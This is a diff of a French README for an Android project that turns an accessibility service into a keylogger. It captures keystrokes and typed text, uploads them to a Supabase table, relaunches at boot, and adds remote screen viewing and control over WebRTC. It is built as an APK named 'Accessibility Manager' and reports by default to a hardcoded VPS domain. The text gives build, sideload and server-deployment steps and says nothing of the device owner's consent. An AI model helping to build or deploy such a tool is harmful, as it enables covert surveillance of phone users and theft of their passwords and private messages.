@@ -1,112 +1,131 @@
-# Android Key Tracker
+# Android Tracker (Key + Screen Share)
 
-Application Next.js pour afficher en temps réel les touches tapées sur un appareil Android.
+Application Android (service d’accessibilité) + viewer web Next.js.
+
+- Capture **touches/texte** (envoi vers Supabase)
+- Mode **scrcpy-like sans ADB**: **visualisation écran + interactions** via **MediaProjection + WebRTC + Accessibility**
 
 ## Architecture
 
 ```
-Android Device (APK) → API Endpoint → In-Memory Store → SSE Stream → Next.js Frontend
+Android Device (APK) → Supabase REST API → Table `public.android_events`
 ```
 
-## Installation et déploiement
+Pour le mode “viewer”:
 
-### Application Next.js
-
-1. Installer les dépendances :
-```bash
-npm install
+```
+Android Device (APK) → Next.js (signalisation) ↔ WebRTC ↔ Browser (/view/[sessionId])
 ```
 
-2. Lancer en développement :
-```bash
-npm run dev
-```
+## Installation
 
-3. Déployer sur Vercel :
-```bash
-npm install -g vercel
-vercel
-```
+### Base de données (Supabase)
 
-Après le déploiement, notez l'URL de votre application (ex: `https://votre-app.vercel.app`)
+- Table: `public.android_events`
+- Écriture: insert via policy RLS “anon” (simple et fonctionnel)
 
 ### Application Android
 
 1. Ouvrir le projet dans Android Studio :
    - Ouvrir le dossier `android-app`
 
-2. Configurer l'URL de l'endpoint :
-   - Modifier `android-app/app/src/main/res/values/strings.xml`
-   - Remplacer `https://votre-app.vercel.app/api/keys` par votre URL Vercel
+2. Configurer Supabase (local, simple) :
+   - Modifier `android-app/local.properties`
+   - Renseigner :
+     - `SUPABASE_URL=https://<project-ref>.supabase.co`
+     - `SUPABASE_ANON_KEY=<votre anon key>`
 
-3. Compiler l'APK :
-   - Build → Build Bundle(s) / APK(s) → Build APK(s)
-   - L'APK sera généré dans `android-app/app/build/outputs/apk/`
+3. Configurer la signalisation WebRTC (viewer Next.js) :
+   - Dans `android-app/local.properties`, ajouter :
+     - `SIGNALING_BASE_URL=http://<IP_DE_VOTRE_PC>:3000`
+   - Important : **ne pas mettre `localhost`** (sur Android, `localhost` = le téléphone).
 
-4. Installer sur votre appareil Android :
-   - Transférer l'APK sur votre appareil
-   - Autoriser l'installation depuis des sources inconnues
-   - Installer l'APK
+4. Compiler l'APK :
+   - Android Studio: Build → Build APK(s)
+   - Ou en CLI: `cd android-app && ./gradlew :app:assembleDebug`
+   - APK: `android-app/app/build/outputs/apk/debug/Accessibility Manager.apk`
 
-5. Activer le service d'accessibilité :
+5. Installer sur votre appareil Android :
+   - Via ADB: `adb install -r "android-app/app/build/outputs/apk/debug/Accessibility Manager.apk"`
+   - Ou sans ADB: copier l’APK sur le téléphone et l’installer (sources inconnues).
+
+6. Activer le service d'accessibilité :
    - Ouvrir l'application "Key Tracker"
    - Cliquer sur "Ouvrir les paramètres d'accessibilité"
    - Activer "Key Tracker Service"
 
+### Viewer web (Next.js)
+
+1. Installer les dépendances:
+   - `npm install`
+2. Lancer en local:
+   - dev: `npm run dev`
+   - prod local: `npm run build && npm start`
+3. Ouvrir le viewer:
+   - l’APK affiche une URL du type `http://<IP_PC>:3000/view/<sessionId>`
+
+### Déploiement VPS (ex: `https://agi.worksbase.pro/`)
+
+- **Domaine**: le viewer et la signalisation tournent sur ton VPS. L’APK peut utiliser soit `SIGNALING_BASE_URL` (si tu le configures), soit par défaut **`https://agi.worksbase.pro`**.
+- **Run Next.js** (sur le VPS, dans le repo):
+  - `npm install`
+  - `npm run build`
+  - `PORT=3000 npm start`
+- **Reverse proxy** (Nginx, exemple minimal):
+
+```nginx
+server {
+  server_name agi.worksbase.pro;
+
+  location / {
+    proxy_pass http://127.0.0.1:3000;
+    proxy_http_version 1.1;
+    proxy_set_header Upgrade $http_upgrade;
+    proxy_set_header Connection "upgrade";
+    proxy_set_header Host $host;
+  }
+}
+```
+
 ## Utilisation
 
-1. Une fois le service d'accessibilité activé, l'application Android commencera à capturer les touches
-2. Les touches sont envoyées à l'endpoint API `/api/keys`
-3. Ouvrir l'application web sur `https://votre-app.vercel.app`
-4. Les touches apparaîtront en temps réel via Server-Sent Events (SSE)
+1. Une fois le service d'accessibilité activé, l'application Android commencera à capturer les touches/texte.
+2. Les events sont insérés dans Supabase dans `public.android_events`.
+3. Pour voir les données: Supabase Dashboard → Table Editor → `android_events` (ou via SQL).
 
 ## Fonctionnalités
 
 - Capture des touches via le service d'accessibilité Android
-- Envoi automatique des données vers l'API
-- Affichage en temps réel sur la page web
+- Envoi automatique des données vers Supabase
 - Auto-lancement au démarrage de l'appareil
 - Interface simple et minimaliste
+- Partage écran WebRTC + interactions (tap/swipe/back/home/texte) via Accessibility
 
 ## Limitations
 
-- Pas de persistance des données (stockage en mémoire uniquement)
-- Les données sont perdues au redémarrage du serveur Vercel
-- Pas d'authentification (endpoint public)
+- Policy RLS “anon insert” volontairement permissive (prototype)
 - Nécessite Android 5.0+ (API Level 21+)
+- En dehors du LAN, un serveur TURN est souvent nécessaire (non inclus dans ce mode “au plus simple”).
 
 ## Structure du projet
 
 ```
 android-tracker/
-├── app/
-│   ├── api/
-│   │   ├── keys/
-│   │   │   └── route.js      # Endpoint POST pour recevoir les touches
-│   │   └── stream/
-│   │       └── route.js      # Endpoint SSE pour diffuser les touches
-│   ├── layout.jsx            # Layout principal
-│   └── page.jsx              # Page principale avec affichage en temps réel
-├── lib/
-│   └── store.js              # Store en mémoire avec EventEmitter
 ├── android-app/              # Application Android
 │   └── app/src/main/
 │       ├── java/com/andtracker/
 │       │   ├── KeyTrackerService.java  # Service d'accessibilité
 │       │   ├── MainActivity.java      # Activity principale
 │       │   └── BootReceiver.java      # Receiver pour auto-lancement
+│       │   └── SupabaseAndroidEventsClient.java # Client REST Supabase
 │       └── res/
 │           ├── values/strings.xml
 │           └── xml/accessibility_service_config.xml
-├── package.json
-├── next.config.js
-└── vercel.json
-
 ```
 
 ## Notes importantes
 
 - Le service d'accessibilité doit être activé manuellement dans les paramètres Android
 - L'application Android nécessite les permissions d'accessibilité pour fonctionner
-- L'URL de l'endpoint doit être configurée avant de compiler l'APK
-- Pour la production, considérez ajouter une authentification pour sécuriser l'endpoint API
+- Supabase doit être configuré avant de compiler l'APK
+- Pour la production: restreindre la policy (auth, device allowlist, etc.)
